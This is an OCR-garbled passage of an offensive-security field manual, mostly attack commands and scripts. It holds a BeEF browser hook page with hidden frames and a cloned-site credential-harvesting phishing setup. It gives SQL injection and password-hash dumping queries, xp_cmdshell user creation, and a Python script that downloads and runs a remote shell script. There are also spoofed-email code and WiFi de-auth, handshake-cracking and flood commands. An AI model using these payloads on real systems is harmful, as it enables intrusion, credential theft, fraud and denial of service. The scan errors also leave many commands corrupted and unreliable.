+
+Firefox 
+
+17 . 0/MacOSX 10.7 
+
+Mozilla/5.0 (Macintosh; 
+rv : 17 . 0 ) Gecko/20100101 
+
+Intel Mac OS X 
+Firefox/1" .0 
+
+00 
+
+o 
+
+Firefox 
+
+1" . 0/MacOSX 10.8 
+
+
+CtS jij | : M ' 1 
+
+
+Mozilla/5.0 (Windows NT 5.1) 
+
+AppleWebKit/537 . 11 (KHTML, like Gecko) 
+Chrome/ 2 3 . 0 . 12" 1 . 9" Safari/53 7 .11 
+
+Chrome 
+
+Generic/WinXP 
+
+Mozilla/5.0 (Windows NT 6.1) 
+
+AppleWebKit/53 7 . 11 (KHTML, like Gecko) 
+Chrome/23.0. 1271 . 97 Safari /537 . 11 
+
+Chrome 
+
+Generic/Win" 7 
+
+Mozilla/5.0 (Xll; Linux x86 64) 
+AppleWebKit/53 7 . 11 (KHTML, like Gecko) 
+Chrome/ 2 3 .0.1271.9" Safari/53 7 . 11 
+
+Chrome 
+
+Generic/Linux 
+
+Mozilla/5.0 (Macintosh; Intel Mac OS X 
+
+10 _8_2 ) AppleWebKit/53" 7 . 11 (KHTML, like 
+Gecko) Chrome/23 . 0 . 12" 1 . 101 Safari/53" . 11 
+
+Chrome 
+
+Generic/MacOSX 
+
+Mozilla/5.0 (Windows NT 6.1; WOW64) 
+AppleWebKit/535 . 1 (KHTML, like Gecko) 
+Chrome/13 . 0.782 . 112 Safari/535 . 1 
+
+Chrome 
+
+13.0/Win 7 64-bit 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+HTML 
+
+
+HTML BEEF HOOK WITH EMBEDDED FRAME 
+
+
+! DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" - 
+
+html. 
+
+• head. 
+
+-.:title. -Campaign Title /title - 
+script - 
+
+var comma ndModuleStr = '-script src="' + window. location. protocol + 
+'//' + window. location. host + ' : 8080/hook . j s " 
+type="text/j avascript " \/script.. ' ; 
+
+document .write ( commandModuleSt r ) ; 
+
+//Site_ref resh=window . set Timeout ( function ( ) { window . location . href= ' http : //ww 
+w . google . com/ ' } , 20000 ) ; 
+
+/script. - 
+./head • 
+
+.frameset rows="*,lpx" 
+
+•frame src="http : //www . google . com/ " f rameborder=0 
+noresize="noresize" /. 
+
+■ frame src="/e" f rameborder=0 scrolling=no noresize=noresize /> 
+
+■ /frameset 
+/html- 
+
+
+Embedded Java applet (* place within <body> tag) 
+
+applet archive="legit . j ar " code="This is a legit applet" width="l" 
+height="l": - /applet 
+
+Embedded iframe 
+
+
+.'iframe src="http : // 1 . 1 . 1 . 1" width="0" height="0" f rameborder="0" 
+tabindex="-l " title="empty" style=visibility : hidden; display : none " 
+-. / iframe • 
+
+
+Firefox Type Conversions 
+
+
+ASCII Base64 
+
+Base64 ASCII 
+
+ASCII - URI 
+URI ASCII 
+
+
+j avascript : btoa ( "ascii str") 
+j avascript : atob ( "base64==" ) 
+j avascript : encodeURI ( " script- " ) 
+javascript :decodeURI ( "%3cscript%3E" ) 
+
+
+Wget 
+
+
+Capture session token 
+
+
+wget -q — save-cookies=cookie . txt — keep-session-cookies — post- 
+data="username : admin &password=pass&Login=Login" http: // -url /login. php 
+
+
+68 
+
+
+
+Curl 
+
+
+Grab headers and spoof user agent 
+
+
+curl -I -X HEAD -A "Mozilla/5 . 0 (compatible; MS IE 7.01; Windows NT 5.0) 
+http:// ip 
+
+
+Scrape site after login 
+
+
+curl -u usertpass -o outfile https://login.bob.com 
+
+FTP 
+
+curl ftp://user: pas s@ bob . com/ directory/ 
+
+
+Sequential lookup 
+
+
+curl http://bob.com/filetl-10] . txt 
+
+
+Basic Authentication Using Apache2 
+
+The steps below will clone a website and redirect after 3 seconds to 
+another page requiring basic authentication. It has proven very useful for 
+collecting credentials during social engineering engagements. 
+
+1. Start Social Engineering Toolkit (SET) 
+
+/pentest/exploits/set/ . /set 
+
+2. Through SET, use the 'Website Attack Vector' menu to clone your 
+preferred website. k Do not close SET k 
+
+3. In a new terminal create a new directory (lowercase L) 
+
+- mkdir /var/www/1 
+
+4. Browse to SET directory and copy the cloned site 
+
+cd /pentest/exploits/set/src/web_clone/site/template/ 
+cp index.html / var/www/index . html 
+cp index.html /var/www/1/ index . html 
+
+5. Open /var/www/index . html and add tag between head tags 
+
+meta http-equiv="ref resh" 
+content="3;url=http: // domain | ip /1/index . html "/ 
+
+6. Create blank password file to be used for basic auth 
+
+touch /etc/apache2/ . htpasswd 
+
+7. Open /etc/apache2/sites-available/default and add: 
+
+■Directory /var/www/1 
+
+AuthType Basic 
+
+AuthName "PORTAL LOGIN BANNER" 
+
+AuthUser File /etc/ apache2/ . htpasswd 
+Require user test 
+/Directory 
+
+8. Start Apache2 
+
+/etc/init . d/apache2 start 
+
+9. Start Wireshark and add the filter: 
+
+http . authbasic 
+
+10. Send the following link to your target users 
+
+http :// domain | ip - /index . html 
+
+
+69 
+
+
+Automated Web Page Screenshots 
+
+
+Nmap web page SCREENSHOTS [9] 
+
+
+Install dependencies: 
+
+• wget http : //wkhtmltopdf . googlecode . com/ f iles/wkhtmltoimage-0 . 11 . 0_rcl- 
+static-i386 . tar . bz2 
+
+• tar -jxvf wkhtmltoimage-0 . 11 . 0_rcl-static-i38 6 . tar .bz2 
+
+• cp wkhtmltoimage-i386 /usr /local/bin/ 
+
+Install Nmap module: 
+
+• git clone git : //github . com/SpiderLabs/Nmap-Tools . git 
+
+• cd Nmap-Tools/NSE/ 
+
+• cp http-screenshot . nse /usr/local/share/nmap/scripts/ 
+
+• nmap --script-updatedb 
+
+OS/version detection using screenshot script (screenshots saved as .png) : 
+
+• nmap -A -scr ipt=http-screenshot -p80,443 1.1.1.0/24 -oA nmap- 
+
+screengrab 
+
+Script will generate HTML preview page with all screenshots: 
+
+# ! /bin/bash 
+
+print f M HTML BODY BR " preview.html 
+
+Is -1 k . png | awk -F : 1 { print $ 1 " : " $ 2 M \ n BR. IMG SRC=\""$1"%3A"$2"\" 
+width=400 • BR- - BR } ' preview.html 
+printf " /BODY • /HTML " preview.html 
+
+
+PeepingTom web page screenshots 
+
+
+Install Dependencies: 
+
+• Download Phantomj s 
+
+https : //phantomj s . googlecode . com/ files /phantomj s-1 . 9 . 2-linux-x8 6_64 . tar .bz2 
+
+• Download PeepingTom 
+
+git clone https://bitbucket.org/LaNMaSteR53/peepingtom.git 
+
+Extract and copy phantomjs from phantomj s-1 . 9. 2-linux-x86_64 .tar .bz2 and 
+copy to peepingtom directory 
+
+• Run PeepingTom 
+
+python peepingtom. py http://-mytarget.com- 
+
+
+70 
+
+
+
+SQLMap 
+
+
+GET REQUEST 
+
+
+./sqlmap.py -u "http:// url ?id=l&str=val" 
+
+
+POST REQUEST 
+
+./sqlmap.py -u "http:// url." — data="id=l&str=val" 
+
+SQL INJECTION AGAINST SPECIFIC PARAMETER WITH DB TYPE SPECIFIED 
+
+./sqlmap.py -u "http:// url " — data="id=l&str=val" -p M :i d" 
+
+-b — dbms=" mssql | mysql | oracle | postgres " 
+
+SQL INJECTION ON AUTHENTICATED SITE 
+
+1. Login and note cookie value ( cookiel=vall , cookie2=val2 ) 
+
+./sqlmap.py -u "http:// url " — data="id=l&str=val" -p i r 'i d " 
+
+— cookie=" cookie l=val 1 ; cookie2=val2 " 
+
+
+SQL INJECTION AND COLLECT DB VERSION, NAME, AND USER 
+
+
+./sqlmap.py -u "http:// url " — data="id=l&str=val" -p "id" -b --current-db 
+— current-user 
+
+
+SQL INJECTION AND GET TABLES OF DB=TESTDB 
+
+
+./sqlmap.py -u "http:// url " — data="id=l&str=val " -p "id" --tables -D 
+"testdb" 
+
+
+SQL INJECTION AND GET COLUMNS OF USER TABLE 
+
+
+./sqlmap.py -u "http:// url " — data="id=l&str=val " -p "id" --columns -T 
+"users" 
+
+
+71 
+
+
+Databases 
+
+
+
+MS -SQL 
+
+
+SELECT @@version 
+EXEC xp_msver 
+
+EXEC master .. xp_cmdshell 'net user' 
+
+SELECT HOST_NAME ( ) 
+
+SELECT DB_NAME ( ) 
+
+SELECT name FROM master .. sysdatabases ; 
+
+SELECT user_name() 
+
+SELECT name FROM master .. syslogins 
+SELECT name FROM master .. sysobj ects WHERE 
+xtype= 'U' ; 
+
+SELECT name FROM syscolumns WHERE id= (SELECT 
+id FROM sysobjects WHERE name= 'mytable' ) ; 
+
+
+DB version 
+
+Detailed version info 
+Run OS command 
+Hostname & IP 
+Current DB 
+List DBs 
+Current user 
+List users 
+List tables 
+
+List columns 
+
+
+System table containing info on all tables 
+
+SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA . TABLES 
+
+List all tables /columns 
+
+
+SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE 
+name = 'mytable') 
+
+
+Password hashes ( 2005 ) 
+
+
+SELECT name, password_hash FROM master . sys . sql_logins 
+
+
+POSTGRES 
+
+SELECT version ( ) ; 
+
+SELECT inet_server_addr ( ) 
+
+SELECT current_database ( ) ; 
+
+SELECT datname FROM pg_database; 
+
+SELECT user; 
+
+SELECT username FROM pg_user; 
+
+SELECT username, passwd FROM pg_shadow 
+
+
+DB version 
+Hostname & IP 
+Current DB 
+List DBs 
+Current user 
+List users 
+
+List password hashes 
+
+
+List columns 
+
+
+SELECT relname, A.attname FROM pg_class C, pg_namespace N, pg_attribute A, 
+pg_type T WHERE (C. relkind=' r ' ) AND (N . oid=C . relnamespace ) AND 
+(A. attrelid=C. oid) AND (A. atttypid-T . oid) AND (A.attnum-0) AND (NOT 
+A. attisdropped) AND (N.nspname ILIKE 'public') 
+
+
+List tables 
+
+
+SELECT c. relname FROM pg_catalog . pg_class c LEFT JOIN 
+
+pg_catalog . pg_namespace n ON n.oid = c . relnamespace WHERE c.relkind IN 
+('r',") AND n.nspname NOT IN ( 'pg_catalog' , 'pg_toast' ) AND 
+pg_catalog . pg_table_is_visible (c . oid) 
+
+
+" 3 
+
+
+
+MySQL 
+
+
+SELECT @ @ version ; 
+
+SELECT @@hostname; 
+
+SELECT database (); 
+
+SELECT distinct (db) FROM mysql.db; 
+
+SELECT user(); 
+
+SELECT user FROM mysql.user; 
+
+SELECT host, user , password FROM mysql.user; 
+
+
+DB version 
+Hostname & IP 
+Current DB 
+List DBs 
+Current user 
+List users 
+
+List password hashes 
+
+
+List all tables & columns 
+
+
+SELECT table_schema, table_name, column_name FROM 
+information_schema . columns WHERE 
+
+table_schema != ' mysql' AND table_schema != 1 inf ormation_schema ' 
+
+
+Execute OS command through MySQL 
+
+
+osql -S ip, -port. -U sa -P pwd -Q "exec xp_cmdshell 'net user /add user 
+pass' " 
+
+
+Read world -readable files 
+
+UNION ALL SELECT LOAD_FILE ( ' / etc/ passwd' ) ; 
+
+Write to file system 
+
+SELECT * FROM mytable INTO dumpfile Vtmp/somefile' ; 
+
+Oracle 
+
+
+SELECT * FROM v$version; 
+
+SELECT version FROM v$instance; 
+
+SELECT instance_name FROM v$instance; 
+
+SELECT name FROM v$database; 
+
+SELECT DISTINCT owner FROM all_tables; 
+
+SELECT user FROM dual; 
+
+SELECT username FROM all_users ORDER BY 
+username; 
+
+SELECT column_name FROM all_tab__columns ; 
+
+SELECT table_name FROM all_tables; 
+
+SELECT name, password, astatus FROM sys.user$; 
+
+
+DB version 
+DB version 
+Current DB 
+Current DB 
+List DBs 
+Current user 
+List users 
+
+List columns 
+
+List tables 
+
+List password hashes 
+
+
+List DBAs 
+
+
+SELECT DISTINCT grantee FROM dba_sys_privs WHERE ADMINJDPTION = 1 
+
+
+74 
+
+
+YES’ ; 
+
+
+
+75 
+
+
+Programming 
+
+
+
+PYTHON 
+
+
+Python port scanner 
+
+
+import socket as sk 
+for port in range ( 1 , 1024 ) : 
+try: 
+
+s=sk. socket ( Sk . AF_INET, sk . SOCK_STREAM) 
+s . settimeout ( 1000 ) 
+s . connect ( ('127.0.0.1', port ) ) 
+print '%d:OPEN' % (port) 
+s . close 
+
+except: continue 
+
+
+Python base 6 4 wordlist 
+
+
+# ! /usr/bin/python 
+import base64 
+f ilel=open ( "pwd . 1st" , "r" ) 
+f ile2=open ( "b64pwds . 1st" , "w" ) 
+for line in filel: 
+
+clear = "administrator:" + str . strip ( line ) 
+new = base64 . encodestring ( clear ) 
+file2 .write (new) 
+
+
+Convert Windows registry hex format to readable ASCII 
+
+
+import binascii, sys, string 
+
+dataFormatHex = binascii . a2b_hex ( sys . argv [ If) 
+output = "" 
+
+for char in dataFormatHex: 
+
+if char in string . printable : output += char 
+J> else: output += 
+print "\n" + output 
+
+
+Read all files in folder and search for regex 
+
+
+import glob, re 
+
+for msg in glob . glob ( '/tmp / k . txt ') : 
+filer = open ( (msg) ,' r' ) 
+data = filer. read ( ) 
+
+message = re . findall ( r' message. ■(. * ? ) /message ' , data, re . DOTALL) 
+print "File %s contains %s" % (str (msg) , message) 
+filer . close ( ) 
+
+SSL encrypted SimpleHTTP Server 
+
+
+# Create SSL cert (follow prompts for customization) 
+
+> openssl req -new -x509 -keyout cert. pern -out cert. pern -days 365 -nodes 
+
+# Create httpserver . py 
+
+import BaseHTTPServer, SimpleHTTPServer , ssl 
+cert = "cert.pem" 
+
+httpd = BaseHTTPServer . HTTPServer ((' 192 . 168 . 1 . 10 ', 443) , 
+
+SimpleHTTPServer . SimpleHTTPRequestHandler ) 
+
+httpd. socket = ssl .wrap_socket (httpd. socket, cert f ile=cert , server_side=True ) 
+httpd . serve_forever ( ) 
+
+
+Python HTTP server 
+
+
+python -m SimpleHTTPServer 8080 
+
+
+Python email sender (* Sendmail must be installed) 
+
+
+# ! /usr/bin/python 
+import smtplib, string 
+import os, time 
+
+os . system ( "/etc/init . d/ sendmail start" ) 
+time . sleep ( 4 ) 
+
+HOST = "localhost " 
+
+SUBJECT = "Email from spoofed sender" 
+TO = "target@you.com" 
+
+FROM = "spoof@spoof.com" 
+
+TEXT = "Message Body" 
+
+BODY = string . j oin ( ( 
+
+"From: %s" % FROM, 
+
+"To: %s" % TO, 
+
+"Subject: %s" % SUBJECT , 
+
+TEXT 
+
+), "\r\n" ) 
+
+server = smtplib . SMTP (HOST) 
+server . sendmail ( FROM, [TO], BODY) 
+server . quit ( ) 
+
+time . sleep (4 ) 
+
+os. system ("/etc/init. d/ sendmail stop" ) 
+
+
+LOOP THROUGH IP LIST , DOWNLOAD FILE OVER HTTP AND EXECUTE 
+
+
+# ! /usr/bin/python 
+import urllib2, os 
+
+urls = ["1.1. 1.1", "2. 2. 2. 2"] 
+port = "80" 
+payload = "cb.sh" 
+
+for url in urls: 
+
+u = "http : //%s : %s/%s" % (url, port, payload) 
+try: 
+
+r = urllib2 . urlopen (u) 
+
+wfile = open ( "/tmp/cb . sh" , "wb" ) 
+
+wfile . write ( r . read ( ) ) 
+
+wfile . close ( ) 
+
+break 
+
+except: continue 
+
+if os .path. exists ( "/tmp/cb. sh" ) : 
+os . system ( "chmod "00 /tmp/cb. sh") 
+os . system ( "/tmp/cb . sh" ) 
+
+
+
+Python HTTP banner grabber (* takes an IP range, port, and 
+
+PACKET DELAY) 
+
+
+# ! /usr/bin/python 
+import urllib2, sys, time 
+
+from optparse import OptionParser 
+
+parser = OptionParser ( ) 
+
+parser . add_option ( "-t" , dest= M iprange" , help=" target IP range, i.e. 
+192.168.1.1-25") 
+
+parser . add_option ( "-p" , dest="port" , default ="80" , help="port , default =80" ) 
+parser . add_option ( M -d" , dest="delay" , default=" . 5" , help="delay (in seconds), 
+default=.5 seconds") 
+
+
+(opts, args) = parser . parse_args ( ) 
+
+if opts.iprange is None: 
+
+parser . error ( "you must supply an IP range") 
+
+ips = [] 
+headers = { } 
+
+
+octets = opts . iprange . split ('.' ) 
+
+start = octets [3] . split (’-') [0] 
+stop = octets [ 3] . split ( ' - ' ) [If 
+
+for i in range (int ( start ), int ( stop) +1 ) : 
+
+ips . append (' %s . %s . %s . %d ' % (octets [ 0 ], octet s [ 1 ], octets [ 2 ], i ) ) 
+
+print '\nScanning IPs: %s\n' % (ips) 
+
+for ip in ips: 
+try: 
+
+I response = urllib2 . urlopen ( ? http : //%s : %s ' % ( ip, opts . port ) ) 
+* headers[ip] = diet ( response . info () ) 
+except Exception as e: 
+
+headers [ip] = "Error: " + str(e) 
+
+
+time . sleep ( float (opts . delay) ) 
+
+for header in headers: 
+try: 
+
+
+print 
+
+' %s : 
+
+: %s' 
+
+% (header 
+
+except : 
+print 
+
+'%s : 
+
+: % s ' 
+
+% (header 
+
+
+headers [header] . get ( ’ server 1 ) ) 
+headers [header] ) 
+
+
+
+SCAPY 
+
+
+k When you craft TCP packets with Scapy, the underlying OS will not 
+recognize the initial SYN packet and will reply with a RST packet. To 
+mitigate this you need to set the following Iptables rule: 
+
+■ iptables -A OUTPUT -p tcp — tcp-flags RST RST -j DROP 
+
+
+from scapy.all import * 
+
+Is ( ) 
+lsc ( ) 
+conf 
+
+IP (src=RandIP ( ) ) 
+
+Ether ( src=RandMAC ( ) ) 
+
+ip=IP ( src=" 1 . 1 . 1 . 1" , dst="2 . 2 . 2 . 2”) 
+
+tcp=TCP (dport="443" ) 
+
+data="TCP data" 
+
+packet =ip/ tcp/ data 
+
+packet . show ( ) 
+
+send (packet, count =1 ) 
+
+sendp (packet, count =2 ) 
+
+sendpfast (packet) 
+
+sr (packet ) 
+
+srl (packet) 
+
+for i in range ( 0, 1000 ) : send ( packet.- ) 
+sniff (count=100, iface=ethO) 
+
+
+Imports all scapy libraries 
+List all avaiable protocols 
+List all scapy functions 
+Show/set scapy config 
+Generate random src IPs 
+Generate random src MACS 
+Specify IP parameters 
+Specify TCP parameters 
+Specify data portion 
+Create IP()/TCP() packet 
+Display packet configuration 
+Send 1 packet @ layer 3 
+Send 2 packets @ layer 2 
+Send faster using tcpreply 
+Send 1 packet & get replies 
+Send only return 1st reply 
+Send packet 1000 times 
+Sniff 100 packets on ethO 
+
+
+Send IPv6 ICMP msg 
+
+
+sr ( IPv6 ( src=" ipv6 " , dst=" ipv6 • " ) /ICMP ( ) ) 
+
+
+UDP PACKET w/ SPECIFIC PAYLOAD*. 
+
+
+ip=IP ( src=" - ip.:- " , dst=" ip " ) 
+u=UDP (dport=1234 , sport=5678) 
+pay = "my UDP packet" 
+packet=ip/u/pay 
+packet . show ( ) 
+
+wrpcap ( "out .pcap", packet ) : write to pcap 
+
+send (packet ) 
+
+
+NTP FUZZER 
+
+
+packet=IP (src=" - ip " , 
+
+dst=" ip " ) /UDP (dport=123 ) /fuzz (NTP ( version=4 , mode=4 ) ) 
+
+
+Send HTTP message 
+
+
+from scapy.all import k 
+
+# Add iptables rule to block attack box from sending RSTs 
+
+# Create web.txt with entire GET/POST packet data 
+fileweb = open ( "web . txt" ,' r' ) 
+
+data = fileweb . read ( ) 
+ip = IP (dst=" ip. -") 
+
+SYN=ip/TCP ( rport=RandNum (6000,7000) , dport=80, f lags="S" , seq=4 ) 
+
+SYNACK = srl (SYN) 
+
+ACK=ip/TCP ( sport=SYNACK. dport , dport=80, flags="A", seq=SYNACK. ack, ack=SYNACK . 
+
+seq+1 ) / data 
+
+reply, error = sr (ACK) 
+
+print reply. show () 
+
+
+80 
+
+
+
+
+Perl 
+
+
+PERL PORT SCANNER 
+
+
+use strict; use IO::Socket; 
+
+for ( $port=0; $port- '65535; $port + +) { 
+
+$remote=IO: : Socket : : INET-. new ( 
+
+Proto= • "tcp" , PeerAddr= ■ "127 .0.0.1", PeerPort= $port) ; 
+if ( $remote) { print "$port is open\n"}; } 
+
+
+f 
+
+
+# 
+
+
+81 
+
+
+
+REGEX Expressions 
+
+
+
+A 
+
+Start of string 
+
+* 
+
+0 or more 
+
++ 
+
+1 or more 
+
+9 
+
+0 or 1 
+
+
+Any char but \n 
+
+{3} 
+
+Exactly 3 
+
+{3, } 
+
+3 or more 
+
+{3,5} 
+
+3 or 4 or 5 
+
+{315} 
+
+3 or 5 
+
+[345] 
+
+3 or 4 or 5 
+
+[-34] 
+
+Not 3 or 4 
+
+[a-z] 
+
+lowercase a-z 
+
+[A-Z] 
+
+uppercase A-Z 
+
+[0-9] 
+
+digit 0-9 
+
+\d 
+
+Digit 
+
+\D 
+
+Not digit 
+
+\w 
+
+A-Z, a-z, 0-9 
+
+
+\W 
+
+\s 
+
+\S 
+
+
+Not A-Z, a-z, 0-9 
+White Space (\t\r\n\f) 
+Not (\t\r\n\f ) 
+
+
+reg [ex] 
+
+"rege" 
+
+or 
+
+"regx" 
+
+regex? 
+
+"rege" 
+
+or 
+
+"regex" 
+
+regex* 
+
+"rege" 
+
+w/ 
+
+0 or more 
+
+regex+ 
+
+"rege" 
+
+W / 
+
+1 or more 
+
+[Rr ] egex 
+
+"Regex 
+
+" or "regex" 
+
+\d { 3 } 
+
+Exactly 3 
+
+digits 
+
+\d{ 3, } 
+
+3 or more 
+
+digits 
+
+[aeiou] 
+
+Any 1 
+
+vowel 
+
+
+(0 [3-9] | 1 [0-9] | 2 [0-5] ) Numbers 03-25 
+
+
+% 
+
+
+82 
+
+
+ASCII Table 
+
+
+xOO : NUL 
+x08 : BS 
+xO 9 : TAB 
+xOa : LF 
+xOd : CR 
+xlb : ESC 
+x20 : SPC 
+x21 : ! 
+
+x22 : " 
+x23 : # 
+x24 : $ 
+x25 : % 
+x2 6 : & 
+x2' 7 : ' 
+
+x28 : ( 
+
+x2 9 : ) 
+x2a : ■* 
+x2b : + 
+x2c : , 
+x2d : - 
+x2e : . 
+x2f : / 
+x30 : 0 
+x31 : 1 
+x32 : 2 
+x33 : 3 
+x34 : 4 
+x35 : 5 
+x3 6 : 6 
+x3" : 
+x38 : 8 
+x3 9 : 9 
+x3a : : 
+x3b : ; 
+x3c : 
+x3d : = 
+x3e : 
+x3f : ? 
+x40 : @ 
+x4 1 : A 
+x42 : B 
+x43 : C 
+x4 4 : D 
+x45 : E 
+x4 6 : F 
+x4~ : G 
+x4 8 : H 
+x4 9 : I 
+x4a : J 
+
+
+x4b : K 
+x4c : L 
+x4d : M 
+x4e : N 
+x4f : 0 
+x50 : P 
+x51 : Q 
+x52 : R 
+x53 : S 
+x54 : T 
+x55 : U 
+x56 : V 
+x57 : W 
+x58 : X 
+x59 : Y 
+x5a : Z 
+x5b : [ 
+
+x5c : \ 
+x5d : ] 
+x5e : 
+x5f : 
+x60 : 
+x61 : a 
+x62 : b 
+x63 : c 
+x64 : d 
+x65 : e 
+x66 : f 
+x6^ : g 
+x68 : h 
+x69 : i 
+x6a : j 
+x 6b : k 
+x6c : 1 
+x6d : m 
+x6e : n 
+x6f : o 
+x" 0 : p 
+xT.l : q 
+x"2 : r 
+x' 7 3 : s 
+x7 4 : t 
+x~5 : u 
+x 7 6 : v 
+x' 7 7 : w 
+x7 8 : x 
+x 7 9 : y 
+x^a : z 
+
+
+83 
+
+
+Wireless 
+
+
+84 
+
+
+Frequency Chart 
+
+
+RFID 
+
+120-150 kHz (LF) 
+
+13.56 MHz (HF) 
+
+433 MHz (UHF) 
+
+Keyless Entry 
+
+315 MHz (N. Am) 
+
+433.92 MHz (Europe , Asia ) 
+
+Cellular (US) 
+
+698-894 MHz 
+
+1710-1755 MHz 
+
+1850-1910 MHz 
+
+2110-2155 MHz 
+
+GPS 
+
+122 7 . 60, 1575.42 MHz 
+
+L Band 
+
+1-2 GHz 
+
+802.15.4 (ZigBee) 
+
+868 MHz (Europe) 
+
+915 MHz (US, Australia) 
+2.4 GHz (worldwide) 
+
+802.15.1 (Bluetooth) 
+
+2.4-2.483.5 GHz 
+
+802 . llb/g 
+
+2.4 GHz 
+
+802.11a 
+
+5.0 GHz 
+
+8 02 ^ Un 
+
+2. 4/5.0 GHZ 
+
+C Band 
+
+4-8 GHz 
+
+Ku Band 
+
+12-18 GHz 
+
+K Band 
+
+18-26.5 GHz 
+
+Ka Band 
+
+26.5-40 GHz 
+
+
+FCC ID lookup 
+
+| https : //apps . f cc . gov/ oetcf /eas/ report s/GenericSearch . cfm 
+
+Frequency database 
+
+
+http : //www . radioreference . com/ apps /db/ 
+
+1 
+
+1 
+
+Kismet Reference [5] 
+
+e 
+
+List Kismet servers 
+
+h 
+
+Help 
+
+z 
+
+Toggle full-screen view 
+
+n 
+
+Name current network 
+
+m 
+
+Toggle muting of sound 
+
+i 
+
+View detailed information for network 
+
+t 
+
+Tag or untag selected network 
+
+s 
+
+Sort network list 
+
+g 
+
+Group tagged networks 
+
+l 
+
+Show wireless card power levels 
+
+u 
+
+Ungroup current group 
+
+d 
+
+Dump printable strings 
+
+c 
+
+Show clients in current network 
+
+r 
+
+Packet rate graph 
+
+L 
+
+Lock channel hopping to selected channel 
+
+a 
+
+View network statistics 
+
+H 
+
+Return to normal channel hopping 
+
+P 
+
+Dump packet type 
+
++ /- 
+
+Expand/collapse groups 
+
+f 
+
+Follow network center 
+
+CTRL+L 
+
+Re-draw the screen 
+
+w 
+
+Track alerts 
+
+Q 
+
+Quit Kismet 
+
+X 
+
+Close popup window 
+
+
+85 
+
+
+Linux Wifi Commands 
+
+
+iwconf ig 
+rfkill list 
+rf kill unblock all 
+airdump-ng monO 
+
+
+Wireless interface config 
+Identify wifi problems 
+Turn on wifi 
+Monitor all interfaces 
+
+
+Connect to unsecured wifi 
+
+
+iwconfig athO essid $SSID 
+ifconfig athO up 
+dhclient athO 
+
+Connect to WEP wifi network 
+
+
+iwconfig athO essid $SSID key key.- 
+ifconfig athO up 
+dhclient athO 
+
+Connect to WPA-PSK wifi network 
+
+
+iwconfig athO essid $SSID 
+ifconfig athO up 
+
+wpa_supplicant -B -i athO -c wpa-psk.conf 
+dhclient athO 
+
+Connect to WPA-Enterprise wifi network 
+
+
+iwconfig athO essid $SSID 
+ifconfig athO up 
+
+wpa_supplicant -B -i athO -c wpa-ent.conf 
+dhclient athO 
+
+
+Linux Bluetooth 
+
+
+hciconfig hciO up Turn on bluetooth interface 
+
+hcitool -i hciO scan — flush --all Scan for bluetooth devices 
+
+sdptool browse BD_ADDR List open services 
+
+hciconfig hciO name "NAME” class 0x520204 Set as discoverable 
+
+piscan 
+
+pand -K Clear pand sessions 
+
+
+86 
+
+
+
+
+
+Linux Wifi Testing 
+
+
+Start monitor mode interface 
+
+
+airmon-ng stop athO 
+airmon-ng start wifiO 
+iwconfig athO channel $CH 
+
+
+Capture client handshake 
+
+
+airdump-ng -c $CH --bssid $AP -w file athO 
+aireplay-ng -0 10 -a $AP -c $CH athO 
+
+#Capture traffic 
+#Force client de-auth 
+
+Brute force handshake 
+
+
+aircrack-ng -w wordlist capture. cap 
+asleep -r capture. cap -W diet. asleep 
+eapmd5pass -r capture. cap -w wordlist 
+
+# WPA-PSK 
+
+# LEAP 
+
+# EAP-MD5 
+
+DOS ATTACKS 
+
+
+mdk3 int ■ a -a $AP 
+mdk3 int b -c $CH 
+
+#Auth Flood 
+#Beacon Flood 
+
+
+t 
+
+
+Scratch Pad 
+
+
+
+Scratch Pad 
+
+
+89 
+
+
+Scratch Pad 
+
+
+90 
+
+
+
+Scratch Pad 
+
+
+91 
+
+
+Scratch Pad 
+
+
+92 
+
+
+
+Scratch Pad 
+
+
+93 
+
+
+References 
+
+[1] Mubix. Linux/Unix/BSD Post-Exploitation Command List. 
+http://bit.ly/nucONO. Accessed on 17 Oct 2012. 
+
+[2] Tomes, Tim. Safely Dumping Hashes from Live Domain Controllers. 
+
+http : //pauldotcom. com/20 11/11/saf el Y-dumpinq-hashes-from-liv . html . Accessed 
+on 14 Nov 2012. 
+
+[3] Reverse Shell Cheat Sheet, http : / /pentestmonkev . net /cheat- 
+sheet. /shells /reverse- she 11 -cheat- sheet . Accessed on 15 Nov 2012. 
+
+[4] Damele, Bernardo. Reverse Shell One-liners. 
+
+http: //bernardodamele .blogsoot . com/2011/09/reverse-shells-one-liners . html . 
+Accessed on 15 Nov 2012. 
+
+[5] SANS Institute. IEE 802.11 Pocket Reference Guide. 
+
+http: //www . will hack for sushi . com/papers /80211_Pocket_Reference_Guide . pdf . 
+Accessed on 16 Nov 2012. 
+
+[6] Tomes, Tim. Remote Malware Deployment and a Lil' AV Bypass. 
+
+http : U_ pauldotcom. com/2012/05/remote-malware-deployment-and . html . Accessed 
+on 22 Jan 2013. 
+
+[ 7 ] Trusted Sec. Powershell_PoC . 
+
+https : / /www. trustedsec. com/downloads /tools-download/ . Accessed on 25 Jan 
+2013. 
+
+Following copyright and disclaimer apply: 
+
+Copyright 2012 TrustedSec, LLC. All rights reserved. 
+
+Redistribution and use in source and binary forms, with or without 
+modification, are permitted provided that the following conditions are met: 
+
+Redistributions in binary form must reproduce the above copyright notice, 
+this list of conditions and the following disclaimer in the documentation 
+and/or other materials provided with the distribution. 
+
+THIS SOFTWARE IS PROVIDED BY TRUSTEDSEC, LLC "AS IS" AND ANY EXPRESS OR 
+IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES 
+OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN 
+NO EVENT SHALL TRUSTEDSEC, LLC OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, 
+INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGE S 
+(INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR 
+SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER 
+CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT 
+LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY 
+OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH 
+DAMAGE . 
+
+The views and conclusions contained in the software and documentation are 
+those of the authors and should not be interpreted as representing official 
